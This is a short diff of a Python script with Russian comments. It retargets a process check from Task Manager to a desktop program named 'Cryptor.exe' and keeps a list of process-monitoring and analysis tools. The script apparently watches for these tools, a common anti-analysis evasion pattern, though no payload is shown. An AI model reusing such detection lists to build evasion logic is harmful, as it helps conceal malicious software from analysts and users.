@@ -19,8 +19,8 @@ def is_admin():
 root = tk.Tk()
 root.withdraw()
 
-process_name = "Taskmgr.exe"  # имя процесса, который нужно проверить
-process_file_path = '""C:\\Windows\\System32\\Taskmgr.exe""'  # путь к файлу процесса
+process_name = "Cryptor.exe"  # имя процесса, который нужно проверить
+process_file_path = '"C:\\Users\\httpshotmaker\\Desktop\\Cryptor.exe"'  # путь к файлу процесса
 
 processes_non_admin = ["Process Explorer.exe", "Task Manager.exe", "Process Hacker.exe", "Process Monitor.exe",
                        "Autoruns.exe", "Dependency Walker.exe", "Registry Monitor.exe", "Regmon.exe",
